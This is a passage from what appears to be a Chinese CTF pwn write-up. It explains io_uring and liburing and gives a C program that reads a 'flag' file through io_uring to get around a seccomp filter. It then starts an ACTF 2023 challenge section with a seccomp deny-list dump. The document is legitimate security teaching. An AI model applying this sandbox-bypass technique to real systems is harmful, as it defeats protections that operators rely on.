+</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span><span class="p">)</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
+</div>
+</div><p><strong>mmap映射</strong>：</p>
+<p>在初始化<code>io_uring</code>的时候，分别对<code>SQ</code>、<code>CQ</code>、<code>SQEs</code>进行了三次mmap映射，<code>offset</code>参数需要分别设置为<code>IORING_OFF_SQ_RING</code>、<code>IORING_OFF_CQ_RING</code>、<code>IORING_OFF_SQES</code></p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-c"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#define IORING_OFF_SQ_RING 0ULL
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define IORING_OFF_CQ_RING 0x8000000ULL
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define IORING_OFF_SQES 0x10000000ULL</span></span></span></code></pre></td></tr></table></div>
+</div>
+</div><h3 class="heading-element" id="liburing"><span>liburing</span>
+  <a href="#liburing" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>实现了对底层系统调用的封装</p>
+<p>初始化与清理</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-c"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">io_uring</span> <span class="n">ring</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// 初始化 (默认128条目)
+</span></span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">io_uring_queue_init</span><span class="p">(</span><span class="kt">unsigned</span> <span class="n">entries</span><span class="p">,</span> <span class="k">struct</span> <span class="n">io_uring</span> <span class="o">*</span><span class="n">ring</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="n">flags</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// 清理资源
+</span></span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">io_uring_queue_exit</span><span class="p">(</span><span class="k">struct</span> <span class="n">io_uring</span> <span class="o">*</span><span class="n">ring</span><span class="p">);</span></span></span></code></pre></td></tr></table></div>
+</div>
+</div><p>提交队列管理</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-c"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// 获取下一个可用的 SQE
+</span></span></span><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">io_uring_sqe</span> <span class="o">*</span><span class="nf">io_uring_get_sqe</span><span class="p">(</span><span class="k">struct</span> <span class="n">io_uring</span> <span class="o">*</span><span class="n">ring</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// 批量提交 SQE
+</span></span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">io_uring_submit</span><span class="p">(</span><span class="k">struct</span> <span class="n">io_uring</span> <span class="o">*</span><span class="n">ring</span><span class="p">);</span></span></span></code></pre></td></tr></table></div>
+</div>
+</div><p>操作准备函数</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-c"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// 准备读操作
+</span></span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">io_uring_prep_read</span><span class="p">(</span><span class="k">struct</span> <span class="n">io_uring_sqe</span> <span class="o">*</span><span class="n">sqe</span><span class="p">,</span> <span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="n">nbytes</span><span class="p">,</span> <span class="kt">off_t</span> <span class="n">offset</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// 准备写操作
+</span></span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">io_uring_prep_write</span><span class="p">(</span><span class="k">struct</span> <span class="n">io_uring_sqe</span> <span class="o">*</span><span class="n">sqe</span><span class="p">,</span> <span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="n">nbytes</span><span class="p">,</span> <span class="kt">off_t</span> <span class="n">offset</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// 准备打开操作
+</span></span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">io_uring_prep_openat</span><span class="p">(</span><span class="k">struct</span> <span class="n">io_uring_sqe</span> <span class="o">*</span><span class="n">sqe</span><span class="p">,</span> <span class="kt">int</span> <span class="n">dfd</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">path</span><span class="p">,</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">,</span> <span class="kt">mode_t</span> <span class="n">mode</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// 准备关闭操作
+</span></span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">io_uring_prep_close</span><span class="p">(</span><span class="k">struct</span> <span class="n">io_uring_sqe</span> <span class="o">*</span><span class="n">sqe</span><span class="p">,</span> <span class="kt">int</span> <span class="n">fd</span><span class="p">);</span></span></span></code></pre></td></tr></table></div>
+</div>
+</div><p>完成处理</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-c"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// 等待完成事件
+</span></span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">io_uring_wait_cqe</span><span class="p">(</span><span class="k">struct</span> <span class="n">io_uring</span> <span class="o">*</span><span class="n">ring</span><span class="p">,</span> <span class="k">struct</span> <span class="n">io_uring_cqe</span> <span class="o">**</span><span class="n">cqe</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// 查看完成事件(非阻塞)
+</span></span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">io_uring_peek_cqe</span><span class="p">(</span><span class="k">struct</span> <span class="n">io_uring</span> <span class="o">*</span><span class="n">ring</span><span class="p">,</span> <span class="k">struct</span> <span class="n">io_uring_cqe</span> <span class="o">**</span><span class="n">cqe</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// 标记事件已处理
+</span></span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">io_uring_cqe_seen</span><span class="p">(</span><span class="k">struct</span> <span class="n">io_uring</span> <span class="o">*</span><span class="n">ring</span><span class="p">,</span> <span class="k">struct</span> <span class="n">io_uring_cqe</span> <span class="o">*</span><span class="n">cqe</span><span class="p">);</span></span></span></code></pre></td></tr></table></div>
+</div>
+</div><p>进行orw</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-c"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// gcc -o shellcode shellcode.c -luring -lseccomp -static
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;liburing.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;seccomp.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;syscall.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">#define BUFFER_SIZE 4096
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">io_uring</span> <span class="n">ring</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">io_uring_cqe</span> <span class="o">*</span><span class="n">cqe</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">io_uring_sqe</span> <span class="o">*</span><span class="n">sqe</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="n">BUFFER_SIZE</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="nf">io_uring_queue_init</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ring</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sqe</span> <span class="o">=</span> <span class="nf">io_uring_get_sqe</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ring</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">io_uring_prep_openat</span><span class="p">(</span><span class="n">sqe</span><span class="p">,</span> <span class="n">AT_FDCWD</span><span class="p">,</span> <span class="s">&#34;flag&#34;</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">io_uring_submit</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ring</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">io_uring_wait_cqe</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ring</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">cqe</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">fd</span> <span class="o">=</span> <span class="n">cqe</span><span class="o">-&gt;</span><span class="n">res</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">sqe</span> <span class="o">=</span> <span class="nf">io_uring_get_sqe</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ring</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">io_uring_prep_read</span><span class="p">(</span><span class="n">sqe</span><span class="p">,</span> <span class="n">fd</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">BUFFER_SIZE</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">io_uring_submit</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ring</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">io_uring_wait_cqe</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ring</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">cqe</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">sqe</span> <span class="o">=</span> <span class="nf">io_uring_get_sqe</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ring</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">io_uring_prep_write</span><span class="p">(</span><span class="n">sqe</span><span class="p">,</span> <span class="n">STDOUT_FILENO</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">BUFFER_SIZE</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">io_uring_submit</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ring</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">io_uring_queue_exit</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ring</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
+</div>
+</div><h2 class="heading-element" id="actf-2023-master-of-rop"><span>ACTF 2023 master-of-rop</span>
+  <a href="#actf-2023-master-of-rop" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>沙箱禁掉了常用的orw及其替代syscall，需要寻找一些其他的替代syscall</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-sh"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"> line  CODE  JT   JF      <span class="nv">K</span>
+</span></span><span class="line"><span class="cl"><span class="o">=================================</span>
+</span></span><span class="line"><span class="cl"> 0000: 0x20 0x00 0x00 0x00000004  <span class="nv">A</span> <span class="o">=</span> arch
+</span></span><span class="line"><span class="cl"> 0001: 0x15 0x00 0x19 0xc000003e  <span class="k">if</span> <span class="o">(</span>A !<span class="o">=</span> ARCH_X86_64<span class="o">)</span> goto <span class="m">0027</span>
+</span></span><span class="line"><span class="cl"> 0002: 0x20 0x00 0x00 0x00000000  <span class="nv">A</span> <span class="o">=</span> sys_number
+</span></span><span class="line"><span class="cl"> 0003: 0x35 0x00 0x01 0x40000000  <span class="k">if</span> <span class="o">(</span>A &lt; 0x40000000<span class="o">)</span> goto <span class="m">0005</span>
+</span></span><span class="line"><span class="cl"> 0004: 0x15 0x00 0x16 0xffffffff  <span class="k">if</span> <span class="o">(</span>A !<span class="o">=</span> 0xffffffff<span class="o">)</span> goto <span class="m">0027</span>
+</span></span><span class="line"><span class="cl"> 0005: 0x15 0x15 0x00 0x00000000  <span class="k">if</span> <span class="o">(</span><span class="nv">A</span> <span class="o">==</span> <span class="nb">read</span><span class="o">)</span> goto <span class="m">0027</span>
+</span></span><span class="line"><span class="cl"> 0006: 0x15 0x14 0x00 0x00000001  <span class="k">if</span> <span class="o">(</span><span class="nv">A</span> <span class="o">==</span> write<span class="o">)</span> goto <span class="m">0027</span>
+</span></span><span class="line"><span class="cl"> 0007: 0x15 0x13 0x00 0x00000002  <span class="k">if</span> <span class="o">(</span><span class="nv">A</span> <span class="o">==</span> open<span class="o">)</span> goto <span class="m">0027</span>
+</span></span><span class="line"><span class="cl"> 0008: 0x15 0x12 0x00 0x00000011  <span class="k">if</span> <span class="o">(</span><span class="nv">A</span> <span class="o">==</span> pread64<span class="o">)</span> goto <span class="m">0027</span>
+</span></span><span class="line"><span class="cl"> 0009: 0x15 0x11 0x00 0x00000012  <span class="k">if</span> <span class="o">(</span><span class="nv">A</span> <span class="o">==</span> pwrite64<span class="o">)</span> goto <span class="m">0027</span>
+</span></span><span class="line"><span class="cl"> 0010: 0x15 0x10 0x00 0x00000013  <span class="k">if</span> <span class="o">(</span><span class="nv">A</span> <span class="o">==</span> readv<span class="o">)</span> goto <span class="m">0027</span>
+</span></span><span class="line"><span class="cl"> 0011: 0x15 0x0f 0x00 0x00000014  <span class="k">if</span> <span class="o">(</span><span class="nv">A</span> <span class="o">==</span> writev<span class="o">)</span> goto <span class="m">0027</span>
+</span></span><span class="line"><span class="cl"> 0012: 0x15 0x0e 0x00 0x00000028  <span class="k">if</span> <span class="o">(</span><span class="nv">A</span> <span class="o">==</span> sendfile<span class="o">)</span> goto <span class="m">0027</span>
+</span></span><span class="line"><span class="cl"> 0013: 0x15 0x0d 0x00 0x0000002c  <span class="k">if</span> <span class="o">(</span><span class="nv">A</span> <span class="o">==</span> sendto<span class="o">)</span> goto <span class="m">0027</span>
+</span></span><span class="line"><span class="cl"> 0014: 0x15 0x0c 0x00 0x0000002e  <span class="k">if</span> <span class="o">(</span><span class="nv">A</span> <span class="o">==</span> sendmsg<span class="o">)</span> goto <span class="m">0027</span>
+</span></span><span class="line"><span class="cl"> 0015: 0x15 0x0b 0x00 0x0000003b  <span class="k">if</span> <span class="o">(</span><span class="nv">A</span> <span class="o">==</span> execve<span class="o">)</span> goto <span class="m">0027</span>
+</span></span><span class="line"><span class="cl"> 0016: 0x15 0x0a 0x00 0x00000101  <span class="k">if</span> <span class="o">(</span><span class="nv">A</span> <span class="o">==</span> openat<span class="o">)</span> goto <span class="m">0027</span>
+</span></span><span class="line"><span class="cl"> 0017: 0x15 0x09 0x00 0x00000127  <span class="k">if</span> <span class="o">(</span><span class="nv">A</span> <span class="o">==</span> preadv<span class="o">)</span> goto <span class="m">0027</span>
+</span></span><span class="line"><span class="cl"> 0018: 0x15 0x08 0x00 0x00000128  <span class="k">if</span> <span class="o">(</span><span class="nv">A</span> <span class="o">==</span> pwritev<span class="o">)</span> goto <span class="m">0027</span>
+</span></span><span class="line"><span class="cl"> 0019: 0x15 0x07 0x00 0x0000012f  <span class="k">if</span> <span class="o">(</span><span class="nv">A</span> <span class="o">==</span> name_to_handle_at<span class="o">)</span> goto <span class="m">0027</span>
+</span></span><span class="line"><span class="cl"> 0020: 0x15 0x06 0x00 0x00000130  <span class="k">if</span> <span class="o">(</span><span class="nv">A</span> <span class="o">==</span> open_by_handle_at<span class="o">)</span> goto <span class="m">0027</span>
+</span></span><span class="line"><span class="cl"> 0021: 0x15 0x05 0x00 0x00000142  <span class="k">if</span> <span class="o">(</span><span class="nv">A</span> <span class="o">==</span> execveat<span class="o">)</span> goto <span class="m">0027</span>
+</span></span><span class="line"><span class="cl"> 0022: 0x15 0x04 0x00 0x00000147  <span class="k">if</span> <span class="o">(</span><span class="nv">A</span> <span class="o">==</span> preadv2<span class="o">)</span> goto <span class="m">0027</span>
+</span></span><span class="line"><span class="cl"> 0023: 0x15 0x03 0x00 0x00000148  <span class="k">if</span> <span class="o">(</span><span class="nv">A</span> <span class="o">==</span> pwritev2<span class="o">)</span> goto <span class="m">0027</span>
+</span></span><span class="line"><span class="cl"> 0024: 0x15 0x02 0x00 0x000001ac  <span class="k">if</span> <span class="o">(</span><span class="nv">A</span> <span class="o">==</span> 0x1ac<span class="o">)</span> goto <span class="m">0027</span>
+</span></span><span class="line"><span class="cl"> 0025: 0x15 0x01 0x00 0x000001b5  <span class="k">if</span> <span class="o">(</span><span class="nv">A</span> <span class="o">==</span> 0x1b5<span class="o">)</span> goto <span class="m">0027</span>
+</span></span><span class="line"><span class="cl"> 0026: 0x06 0x00 0x00 0x7fff0000  <span class="k">return</span> ALLOW
